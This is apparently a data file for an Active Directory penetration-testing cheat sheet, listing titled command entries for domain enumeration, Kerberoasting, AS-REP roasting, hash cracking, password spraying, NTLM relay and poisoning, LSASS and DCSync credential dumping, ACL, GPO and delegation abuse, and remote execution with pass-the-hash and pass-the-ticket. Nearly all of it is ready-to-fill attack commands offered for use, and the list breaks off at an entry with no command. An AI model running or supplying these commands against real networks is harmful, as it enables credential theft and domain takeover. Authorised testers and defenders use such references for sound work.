commands.title: Domain Info (net)
commands.description: Gather basic domain information using built-in Windows commands.
commands.command:
net user /domain
net group /domain
net group "Domain Admins" /domain
net localgroup administrators

commands.title: Domain Recon (nltest)
commands.description: Enumerate domain controllers and trust relationships.

commands.title: Domain Info (PowerView)
commands.description: Get comprehensive domain information using PowerView.
commands.command:
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainTrust
Get-ForestTrust

commands.title: Domain Recon (BloodHound)
commands.description: Collect all AD data for BloodHound graph analysis.
commands.command:
.\SharpHound.exe -c All --zipfilename bloodhound_output
# OR
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain {DOMAIN} -ZipFileName bloodhound_data

commands.title: Domain Recon (CME)
commands.description: Enumerate domain details via CrackMapExec.
commands.command:
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --pass-pol
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M get_user_descriptions

commands.title: LDAP Query (ldapsearch)
commands.description: Query LDAP for domain information directly.
commands.command: ldapsearch -x -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "DC={DOMAIN_PART1},DC={DOMAIN_PART2}" "(objectClass=domain)"

commands.title: dsquery Domain Info
commands.description: Use dsquery to enumerate the domain.

commands.title: User Enumeration (PowerView)
commands.description: Enumerate all domain users and their properties.
commands.command:
Get-DomainUser | Select-Object samaccountname, description, memberof, lastlogon
Get-DomainUser -SPN  # Kerberoastable users
Get-DomainUser -PreauthNotRequired  # AS-REP Roastable
Get-DomainUser -AdminCount 1  # Protected accounts

commands.title: User Enum (impacket)
commands.description: Enumerate users via RID brute force without credentials.
commands.command:
impacket-samrdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}
impacket-lookupsid {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}

commands.title: User Enum (CME)
commands.description: Enumerate users via CME with credentials.
commands.command:
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --users
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --rid-brute

commands.title: Kerb User Enum (no creds)
commands.description: Validate usernames against Kerberos without triggering lockouts.
commands.command:
kerbrute userenum -d {DOMAIN} --dc {DC_IP} usernames.txt
kerbrute bruteuser -d {DOMAIN} --dc {DC_IP} {TARGET_USER} passwords.txt

commands.title: User Description Hunt
commands.description: Hunt for passwords stored in user description fields.
commands.command:
Get-DomainUser | Where-Object {$_.description -ne $null} | Select-Object samaccountname, description
Get-DomainUser | Where-Object {$_.description -match "pass|pwd|cred"} | Select-Object samaccountname, description

commands.title: AdminSDHolder Users
commands.description: Find protected accounts (AdminCount=1) — high value targets.
commands.command:
Get-DomainUser -AdminCount 1 | Select-Object samaccountname, memberof
Get-DomainGroup -AdminCount 1 | Select-Object name, member

commands.title: Group Enum (PowerView)
commands.description: Enumerate domain groups and their members.
commands.command:
Get-DomainGroup | Select-Object name, description
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse
Get-DomainGroupMember -Identity "Account Operators" -Recurse

commands.title: Group Enum (CME)
commands.description: Enumerate groups via CrackMapExec.
commands.command:
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} --groups
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -x "net group 'Domain Admins' /domain"

commands.title: Local Admin Hunters
commands.description: Find machines where a user has local admin rights.
commands.command:
Find-LocalAdminAccess -Verbose
Invoke-EnumerateLocalAdmin -Verbose
Get-NetLocalGroupMember -ComputerName {TARGET_COMPUTER} -GroupName Administrators

commands.title: Computer Enum (PowerView)
commands.description: Enumerate domain computers with OS and other details.
commands.command:
Get-DomainComputer | Select-Object name, operatingsystem, dnshostname
Get-DomainComputer -Unconstrained | Select-Object name, dnshostname  # Unconstrained Delegation!
Get-DomainComputer -TrustedToAuth | Select-Object name, dnshostname  # Constrained Delegation

commands.title: Computer Enum (CME)
commands.description: Discover live hosts and their SMB details.

commands.title: Session Hunter
commands.description: Find active user sessions on machines — locate Domain Admins.
commands.command:
Invoke-UserHunter -Verbose
Invoke-UserHunter -GroupName "Domain Admins"
Find-DomainUserLocation -Verbose

commands.title: Find Local Admin Access
commands.description: Find every machine where your current credentials have local administrator rights — your lateral movement map.
commands.command:
# PowerView — where does MY user have local admin?
Find-LocalAdminAccess -Verbose

# netexec — spray creds and flag (Pwn3d!) where you are admin
netexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD}
netexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH} | grep Pwn3d

# Who is local admin WHERE (reverse view)
Invoke-EnumerateLocalAdmin -Verbose

commands.title: Hunt Sessions (Find Where Admins Are)
commands.description: Locate which machines high-value users are logged into — pick a box, steal their token/creds.
commands.command:
# Where are Domain Admins logged in?
Invoke-UserHunter -GroupName "Domain Admins" -Verbose
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# netexec — enumerate logged-on users across the subnet
netexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --loggedon-users

commands.title: Find Shares (ShareFinder / Snaffler)
commands.description: Discover readable/writable shares across the domain and hunt them for secrets (passwords, keys, configs).
commands.command:
# PowerView — find shares you can reach
Invoke-ShareFinder -CheckShareAccess -Verbose

# netexec — list shares + permissions across the subnet
netexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --shares

# Snaffler — auto-hunt shares for juicy files (creds, keys, .config)
.\Snaffler.exe -s -d {DOMAIN} -o snaffler.log

# manspider (Linux) — regex-grep all shares for secrets
manspider {DC_IP}/24 -u {USERNAME} -p {PASSWORD} -c "password|pwd|secret"

commands.title: Find Interesting ACLs
commands.description: Find dangerous rights (GenericAll, WriteDacl, ForceChangePassword, WriteOwner) that low-priv users hold over privileged objects.

commands.title: SMB Share Enum (CME)
commands.description: Enumerate accessible SMB shares across the network.
commands.command:
crackmapexec smb {DC_IP}/24 -u {USERNAME} -p {PASSWORD} --shares
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} --shares

commands.title: Spider Shares (CME)
commands.description: Recursively spider shares for interesting files.
commands.command:
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M spider_plus
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M spider_plus --share SYSVOL

commands.title: SMB Enum (smbclient)
commands.description: Connect to and enumerate SMB shares.

commands.title: SMB Enum (enum4linux)
commands.description: Comprehensive SMB/SAMBA enumeration tool.
commands.command:
enum4linux -a {DC_IP}
enum4linux-ng -A {DC_IP} -u {USERNAME} -p {PASSWORD}

commands.title: GPP Passwords (SYSVOL)
commands.description: Find Group Policy Preferences passwords in SYSVOL (AES encrypted, decryptable).
commands.command:
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_password
crackmapexec smb {DC_IP} -u {USERNAME} -p {PASSWORD} -M gpp_autologin
Get-GPPPassword  # PowerSploit

commands.title: DNS Zone Transfer
commands.description: Attempt DNS zone transfer — exposes full network map.

commands.title: LDAP Enum (ldapsearch)
commands.description: Perform comprehensive LDAP enumeration.
commands.command:
ldapsearch -x -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} -b "DC=corp,DC=local" "(objectCategory=person)(objectClass=user)" samaccountname
ldapsearch -x -H ldap://{DC_IP} -b "DC=corp,DC=local" -D "{USERNAME}@{DOMAIN}" -w {PASSWORD} "(objectClass=group)" cn member

commands.title: LDAP Null Bind
commands.description: Attempt anonymous/null LDAP bind to enumerate without credentials.
commands.command:
ldapsearch -x -H ldap://{DC_IP} -b "" -s base
ldapsearch -x -H ldap://{DC_IP} -b "DC=corp,DC=local" "(objectClass=*)"

commands.title: Read LAPS Passwords
commands.description: If you can read ms-Mcs-AdmPwd, you get the local admin password in cleartext.
commands.command:
# netexec (auto-finds readable LAPS)
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} -M laps

# PowerView — who can read LAPS, and the values
Get-DomainComputer | Select-Object name, ms-mcs-admpwd

# pyLAPS
python3 pyLAPS.py --action get -d {DOMAIN} -u {USERNAME} -p {PASSWORD}

commands.title: Read gMSA Password (Golden gMSA)
commands.description: Retrieve the managed password blob of a gMSA and derive its NT hash.
commands.command:
# gMSADumper
python3 gMSADumper.py -u {USERNAME} -p {PASSWORD} -d {DOMAIN}

# netexec
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --gmsa

commands.title: Find AS-REP Roastable Users (PowerView)
commands.description: Find all accounts with 'Do Not Require Pre-Authentication' set — AS-REP Roastable.
commands.command:
# Method 1 - PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, userprincipalname, pwdlastset
Get-DomainUser -PreauthNotRequired -Properties samaccountname, distinguishedname, memberof

# Method 2 - LDAP filter directly
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# Count vulnerable accounts
(Get-DomainUser -PreauthNotRequired).count

commands.title: Find AS-REP Roastable (impacket — no creds)
commands.description: Enumerate AS-REP roastable users via LDAP without credentials.

commands.title: Find AS-REP Roastable (ldapsearch)
commands.description: Query LDAP directly for accounts without Kerberos pre-auth required.
commands.command:
# UAC flag 4194304 = DONT_REQ_PREAUTH
ldapsearch -x -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD}   -b "DC=corp,DC=local"   "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"   samaccountname userAccountControl pwdLastSet

# Also combined with disabled check (enabled only):
ldapsearch -x -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD}   -b "DC=corp,DC=local"   "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"   samaccountname

commands.title: Find AS-REP Roastable (CME)
commands.description: Use CME LDAP module to identify AS-REP Roastable accounts.
commands.command:
crackmapexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --asreproast asrep_output.txt
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --asreproast asrep_output.txt

commands.title: Find SPN / Kerberoastable Users (PowerView)
commands.description: Enumerate all accounts with Service Principal Names set — Kerberoastable.
commands.command:
# Find all SPN accounts
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, pwdlastset, admincount

# Detailed SPN view with group membership
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof | Format-List

# Find high-value SPN accounts (DA members with SPNs — golden targets!)
Get-DomainUser -SPN -AdminCount 1 | Select-Object samaccountname, serviceprincipalname

# Count
(Get-DomainUser -SPN).count

commands.title: Find SPNs (impacket)
commands.description: List all SPN accounts without requesting tickets (recon only).

commands.title: Find SPNs (ldapsearch / dsquery)
commands.description: Query LDAP for SPN accounts — stealthy, no ticket requests.
commands.command:
# ldapsearch — find all accounts with SPNs
ldapsearch -x -H ldap://{DC_IP} -D "{USERNAME}@{DOMAIN}" -w {PASSWORD}   -b "DC=corp,DC=local"   "(&(objectClass=user)(servicePrincipalName=*))"   samaccountname servicePrincipalName

# dsquery (Windows)
dsquery * -filter "(&(objectCategory=user)(servicePrincipalName=*))" -attr samaccountname servicePrincipalName

commands.title: Find SPNs (CME LDAP)
commands.description: Use CME/NetExec LDAP to enumerate Kerberoastable accounts.
commands.command:
crackmapexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --kerberoasting kerb_output.txt
netexec ldap {DC_IP} -u {USERNAME} -p {PASSWORD} --kerberoasting kerb_output.txt

commands.title: Find SPNs (Rubeus — recon only)
commands.description: List Kerberoastable users without requesting any tickets (recon mode).
commands.command:
# List only — no ticket request
.\Rubeus.exe kerberoast /stats

# Find accounts using specific encryption (RC4 = easier to crack)
.\Rubeus.exe kerberoast /stats /rc4opsec

commands.title: Both Roasting Targets at Once
commands.description: One-shot: find ALL AS-REP + Kerberoastable users simultaneously.
commands.command:
# PowerView — full picture
Write-Host "=== AS-REP ROASTABLE ===" -ForegroundColor Red
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, admincount

Write-Host "=== KERBEROASTABLE (SPN) ===" -ForegroundColor Yellow
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, admincount

Write-Host "=== HIGH VALUE: DA members in both ===" -ForegroundColor Magenta
Get-DomainUser -SPN -AdminCount 1 | Select-Object samaccountname
Get-DomainUser -PreauthNotRequired -AdminCount 1 | Select-Object samaccountname

commands.title: Shortest Path to Domain Admin
commands.description: Find the shortest path from ANY user to Domain Admin group.
commands.command:
// Shortest path from any owned user to DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)domain admins.*"
RETURN p

// All shortest paths to DA (not just owned)
MATCH p=shortestPath((u:User)-[*1..]->(g:Group))
WHERE g.name =~ "(?i)domain admins.*"
AND u.name <> g.name
RETURN p LIMIT 10

// Shortest path from specific user
MATCH p=shortestPath((u:User {name:"{USERNAME}@{DOMAIN}"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@{DOMAIN}"}))
RETURN p

commands.title: Find AS-REP Roastable Users
commands.description: Query BloodHound for all accounts with pre-auth not required.
commands.command:
// All AS-REP roastable accounts
MATCH (u:User {dontreqpreauth:true, enabled:true})
RETURN u.name, u.pwdlastset, u.admincount
ORDER BY u.admincount DESC

// AS-REP roastable with path to DA
MATCH p=shortestPath((u:User {dontreqpreauth:true, enabled:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)domain admins.*"
RETURN p

// AS-REP roastable that are admins (CRITICAL!)
MATCH (u:User {dontreqpreauth:true, enabled:true, admincount:true})
RETURN u.name ORDER BY u.name

commands.title: Find Kerberoastable Users (SPNs)
commands.description: Query BloodHound for all SPN accounts — Kerberoastable targets.
commands.command:
// All Kerberoastable accounts
MATCH (u:User {hasspn:true, enabled:true})
RETURN u.name, u.serviceprincipalnames, u.pwdlastset, u.admincount
ORDER BY u.admincount DESC, u.pwdlastset ASC

// High-value: Kerberoastable DA members
MATCH (u:User {hasspn:true, enabled:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i)domain admins.*"
RETURN u.name, u.serviceprincipalnames

// Kerberoastable with path to DA
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group))
WHERE g.name =~ "(?i)domain admins.*"
RETURN p LIMIT 5

commands.title: Unconstrained Delegation
commands.description: Find computers and users with Unconstrained Delegation set.

commands.title: Find Owned Objects & DA Paths
commands.description: Track owned nodes and find DA paths from your current access.

commands.title: ACL Abuse Paths
commands.description: Find dangerous ACL relationships: GenericAll, WriteDACL, ForceChangePassword.

commands.title: High Value Nodes Overview
commands.description: Comprehensive overview of the most important AD objects to target.
commands.command:
// All Domain Admin members
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i)domain admins.*"
RETURN u.name, u.enabled, u.pwdlastset

// Enterprise Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ "(?i)enterprise admins.*"
RETURN u.name

// DCs in the domain
MATCH (c:Computer {isdc:true})
RETURN c.name, c.operatingsystem

// Computers with sessions from DA accounts
MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo]->(c:Computer)
WHERE g.name =~ "(?i)domain admins.*"
RETURN DISTINCT c.name

// Non-DA users with admin rights to computers
MATCH (u:User)-[:AdminTo]->(c:Computer)
WHERE NOT (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@{DOMAIN}"})
RETURN u.name, c.name

commands.title: Sessions & Lateral Movement
commands.description: Find DA sessions on non-DC computers — perfect for token stealing.
commands.command:
// DA sessions on workstations (not DCs)
MATCH (u:User)-[:MemberOf*1..]->(g:Group),
      (u)-[:HasSession]->(c:Computer)
WHERE g.name =~ "(?i)domain admins.*"
AND NOT c.isdc = true
RETURN u.name AS DomainAdmin, c.name AS LoggedOnTo

// Computers where owned user has admin
MATCH (u:User {owned:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

// Computers reachable with local admin from owned
MATCH (u:User {owned:true})-[:AdminTo|HasSession|CanRDP*1..]->(c:Computer)
RETURN DISTINCT c.name

commands.title: AS-REP Roast (impacket)
commands.description: Request AS-REP for accounts without Kerberos pre-auth required.
commands.command:
impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -no-pass -request -format hashcat -outputfile asrep_hashes.txt
impacket-GetNPUsers {DOMAIN}/{USERNAME}:{PASSWORD} -request -format hashcat

commands.title: AS-REP Roast (Rubeus)
commands.description: Rubeus AS-REP roasting — finds and requests all vulnerable accounts.
commands.command:
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
.\Rubeus.exe asreproast /user:{TARGET_USER} /format:hashcat

commands.title: Crack AS-REP Hashes
commands.description: Crack AS-REP hashes offline with hashcat.
commands.command:
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

commands.title: Kerberoast (impacket)
commands.description: Request service tickets for all SPN accounts for offline cracking.
commands.command:
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request
impacket-GetUserSPNs {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {DC_IP} -request -outputfile kerb_hashes.txt

commands.title: Kerberoast (Rubeus)
commands.description: Rubeus kerberoasting with AES downgrade to RC4.
commands.command:
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
.\Rubeus.exe kerberoast /user:{TARGET_USER} /nowrap
.\Rubeus.exe kerberoast /rc4opsec /outfile:kerb_hashes.txt  # RC4 only (crackable)

commands.title: Kerberoast (PowerView)
commands.description: Find Kerberoastable accounts using PowerView.
commands.command:
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash

commands.title: Crack Kerberoast Hashes
commands.description: Crack TGS-REP hashes (RC4=13100, AES128=19600, AES256=19700).
commands.command:
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

commands.title: Password Spray (Kerbrute)
commands.description: Spray passwords against valid usernames via Kerberos.
commands.command:
kerbrute passwordspray -d {DOMAIN} --dc {DC_IP} users.txt {PASSWORD}
kerbrute bruteforce -d {DOMAIN} --dc {DC_IP} combos.txt  # user:pass combos

commands.title: Password Spray (CME)
commands.description: Spray passwords across domain via SMB — check lockout policy first!
commands.command:
crackmapexec smb {DC_IP} -u users.txt -p {PASSWORD} --continue-on-success
crackmapexec smb {DC_IP}/24 -u {USERNAME} -p passwords.txt --no-bruteforce

commands.title: Password Spray (DomainPasswordSpray)
commands.description: Smart spray that observes AD lockout policy automatically.
commands.command:
Invoke-DomainPasswordSpray -Password {PASSWORD} -OutFile spray_results.txt
Invoke-DomainPasswordSpray -UserList users.txt -Password {PASSWORD} -Force

commands.title: NTLM Relay Setup (Responder + ntlmrelayx)
commands.description: Capture and relay NTLM auth — requires SMB signing disabled.
commands.command:
# Step 1: Disable SMB/HTTP in Responder
sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
responder -I eth0 -wf

# Step 2: Relay to targets (from relay_targets.txt)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"

commands.title: NTLM Relay to LDAP (LDAP Signing Off)
commands.description: Relay auth to LDAP for ACL abuse or Shadow Credentials.
commands.command:
impacket-ntlmrelayx -t ldap://{DC_IP} --delegate-access
impacket-ntlmrelayx -t ldaps://{DC_IP} --shadow-credentials --shadow-target {TARGET_COMPUTER}$

commands.title: Shadow Credentials
commands.description: Add shadow credentials to machine account for auth.
commands.command:
python3 pywhisker.py -d {DOMAIN} -u {USERNAME} -p {PASSWORD} --target {TARGET_COMPUTER}$ --action add
certipy shadow auto -username {USERNAME}@{DOMAIN} -password {PASSWORD} -account {TARGET_COMPUTER}$

commands.title: Responder (LLMNR Poisoning)
commands.description: Poison LLMNR/NBT-NS to capture NTLMv1/v2 hashes.
commands.command:
responder -I eth0 -wFb
responder -I eth0 -w  # Basic mode
# Hashes saved to /usr/share/responder/logs/

commands.title: Crack NTLMv2 Hashes
commands.description: Crack captured NTLMv2 challenge-response hashes.
commands.command:
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt --force
# NTLMv1: -m 5500

commands.title: LSASS Dump (Mimikatz)
commands.description: Dump credentials from LSASS process memory.
commands.command:
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
# Dump to file:
mimikatz # log lsass_dump.txt
mimikatz # sekurlsa::logonpasswords

commands.title: LSASS Dump (CME)
commands.description: Remote LSASS dump via CrackMapExec.
commands.command:
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M lsassy
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH} -M lsassy

commands.title: SAM & SYSTEM Dump
commands.description: Remotely dump SAM database containing local hashes.

commands.title: NTDS.dit Dump (DCSync)
commands.description: DCSync attack — pull all domain hashes as if you're a DC.
commands.command:
# Mimikatz:
mimikatz # lsadump::dcsync /domain:{DOMAIN} /all /csv
mimikatz # lsadump::dcsync /domain:{DOMAIN} /user:krbtgt

# impacket:
impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc-ntds -outputfile ntds_dump

commands.title: Credential Hunt (CME)
commands.description: Hunt for credentials in various locations on remote machines.
commands.command:
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M mimikatz
crackmapexec smb {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -M nanodump

commands.title: PetitPotam (MS-EFSRPC Coercion)
commands.description: Coerce a DC/host to authenticate to your machine — pair with NTLM relay (ESC8/RBCD).

commands.title: Coercer (Multi-Method Coercion)
commands.description: Spray every known coercion RPC method (EFSRPC, DFSNM, PrinterBug, etc.) against a target.
commands.command:
coercer coerce -u {USERNAME} -p {PASSWORD} -d {DOMAIN} -t {DC_IP} -l {ATTACKER_IP}
coercer scan -u {USERNAME} -p {PASSWORD} -d {DOMAIN} -t {DC_IP}

commands.title: PrinterBug / SpoolSample (MS-RPRN)
commands.description: Abuse the spooler service to coerce auth — classic unconstrained delegation trigger.

commands.title: Local Priv Esc Audit (WinPEAS)
commands.description: Comprehensive local privilege escalation enumeration.
commands.command:
.\winPEASx64.exe
.\winPEASx64.exe quiet cmd fast

# Or PowerShell version:
Invoke-PowerSploitSweep
Get-UnquotedService
Get-ModifiableServiceFile

commands.title: Token Impersonation (Incognito)
commands.description: Impersonate available tokens on the system.

commands.title: Find Paths to DA (BloodHound)
commands.description: Use BloodHound to find shortest paths to Domain Admin.
commands.command:
# BloodHound Cypher Queries:
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@{DOMAIN}"})) RETURN p
MATCH (u:User {owned:true})-[r:MemberOf|AdminTo|HasSession|CanRDP*1..]->(g:Group {name:"DOMAIN ADMINS@{DOMAIN}"}) RETURN u, r, g

commands.title: MS14-068 Kerberos Vuln
commands.description: Exploit MS14-068 — escalate any user to Domain Admin on old DCs.
commands.command: impacket-goldenPac {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP}

commands.title: Find ACL Misconfigs (PowerView)
commands.description: Enumerate dangerous ACLs on AD objects.
commands.command:
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteOwner|WriteDacl|ForceChangePassword" -and $_.IdentityReference -notmatch "BUILTIN|Domain Admins|Enterprise Admins|NT AUTHORITY"}
Find-InterestingDomainAcl -ResolveGUIDs

commands.title: GenericAll / ForceChangePassword
commands.description: Abuse GenericAll to reset user password.
commands.command:
# PowerView:
Set-DomainUserPassword -Identity {TARGET_USER} -AccountPassword (ConvertTo-SecureString '{PASSWORD}' -AsPlainText -Force)

# impacket:
impacket-rpcclient {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -c "setuserinfo2 {TARGET_USER} 23 '{PASSWORD}'"

commands.title: DCSync Rights Abuse (WriteDacl)
commands.description: Add DCSync rights to a user via WriteDacl on domain.
commands.command:
Add-DomainObjectAcl -TargetIdentity "DC={DOMAIN}" -PrincipalIdentity {USERNAME} -Rights DCSync
impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{DC_IP} -just-dc

commands.title: Find Writable GPOs
commands.description: Find GPOs that current user can modify.
commands.command: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericWrite|GenericAll" -and $_.IdentityReference -match {USERNAME}}

commands.title: GPO Abuse (SharpGPOAbuse)
commands.description: Abuse GPO write access to add user to local admins.
commands.command:
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {USERNAME} --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" --Author {DOMAIN}\{USERNAME} --Command "cmd.exe" --Arguments '/c net localgroup administrators {USERNAME} /add' --GPOName "Vulnerable GPO"

commands.title: Unconstrained Delegation
commands.description: Abuse unconstrained delegation — trigger DC auth and extract TGT.
commands.command:
# Find unconstrained delegation hosts:
Get-DomainComputer -Unconstrained

# Monitor for and extract incoming TGTs:
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger DC auth (PrinterBug / SpoolSample):
.\SpoolSample.exe {DC_IP} {TARGET_COMPUTER}

commands.title: Constrained Delegation
commands.description: Abuse S4U2Proxy to impersonate any user to allowed services.
commands.command:
# Find constrained delegation accounts:
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Request impersonation ticket:
.\Rubeus.exe s4u /user:{USERNAME} /rc4:{NTLM_HASH} /impersonateuser:Administrator /msdsspn:cifs/{TARGET_COMPUTER} /altservice:http,wsman,host /ptt

impacket-getST {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH} -spn cifs/{TARGET_COMPUTER} -impersonate Administrator

commands.title: RBCD Attack
commands.description: Resource-Based Constrained Delegation — write msDS-AllowedToActOnBehalfOfOtherIdentity.
commands.command:
# Add new machine account:
impacket-addcomputer {DOMAIN}/{USERNAME}:{PASSWORD} -computer-name FAKE_PC$ -computer-pass FakePass123!

# Set RBCD:
Set-DomainRBCD {TARGET_COMPUTER} -DelegateFrom FAKE_PC$

# Get ST:
impacket-getST {DOMAIN}/FAKE_PC$:FakePass123! -spn cifs/{TARGET_COMPUTER}.{DOMAIN} -impersonate Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass

commands.title: PsExec (impacket)
commands.description: Execute commands remotely via SMB and named pipes.
commands.command:
impacket-psexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}
impacket-psexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}

commands.title: SMBExec (impacket)
commands.description: SMB execution — more evasive than PsExec (no service binary dropped).
commands.command:
impacket-smbexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}
impacket-smbexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}

commands.title: WMI Exec (impacket)
commands.description: Execute commands via WMI — no service creation.
commands.command:
impacket-wmiexec {DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_COMPUTER}
impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_COMPUTER} -hashes :{NTLM_HASH}

commands.title: WMI Exec (CME)
commands.description: Remote WMI command execution via CrackMapExec.
commands.command:
crackmapexec wmi {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}
crackmapexec wmi {TARGET_COMPUTER} -u {USERNAME} -H {NTLM_HASH}

commands.title: WinRM (Evil-WinRM)
commands.description: Interactive PowerShell session over WinRM (port 5985/5986).

commands.title: WinRM (CME)
commands.description: Check WinRM access and execute commands.
commands.command:
crackmapexec winrm {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD}
crackmapexec winrm {TARGET_COMPUTER} -u {USERNAME} -p {PASSWORD} -x "whoami"

commands.title: Pass-the-Hash (impacket)
commands.description: Authenticate with NTLM hash instead of plaintext password.

commands.title: Pass-the-Hash (CME)
commands.description: Spray hash across the network to find valid access.
commands.command:
crackmapexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH}
crackmapexec smb {DC_IP}/24 -u {USERNAME} -H {NTLM_HASH} --local-auth

commands.title: Extract & Inject Ticket (Rubeus)
commands.description: Extract Kerberos tickets and inject them for impersonation.
commands.command:
.\Rubeus.exe dump /nowrap  # List all tickets
.\Rubeus.exe dump /user:administrator /service:krbtgt /nowrap
.\Rubeus.exe ptt /ticket:<base64_ticket>
.\Rubeus.exe createnetonly /program:"cmd.exe" /show

commands.title: Pass-the-Ticket (Linux)
commands.description: Use Kerberos .ccache ticket on Linux for auth.
commands.command:
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec {DOMAIN}/Administrator@{TARGET_COMPUTER} -k -no-pass
impacket-secretsdump {DOMAIN}/Administrator@{DC_IP} -k -no-pass

commands.title: Discover & Connect to MSSQL
commands.description: Find SQL servers via SPNs and authenticate (SQL or Windows auth).

commands.title: MSSQL Command Exec (xp_cmdshell)
